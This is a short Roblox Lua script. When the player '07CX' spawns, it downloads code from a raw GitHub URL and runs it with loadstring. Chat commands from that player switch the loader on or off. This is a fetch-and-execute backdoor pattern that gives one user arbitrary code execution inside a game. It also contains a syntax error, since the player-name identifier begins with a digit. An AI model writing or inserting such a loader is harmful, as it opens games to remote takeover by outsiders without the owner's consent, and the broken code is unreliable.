local http = game:GetService("HttpService")



local link = "https://raw.githubusercontent.com/balljeet/balljeet-documents/main/07"
local var = true
game.Players.07CX.Chatted:Connect(function(msg)
if msg == "x" then
var = true
elseif msg == "c" then
var = false

end

end)
game.Players.07CX.CharacterAdded:Connect(function()
wait(2)
if var then
loadstring(http:GetAsync(link))()
end
end)
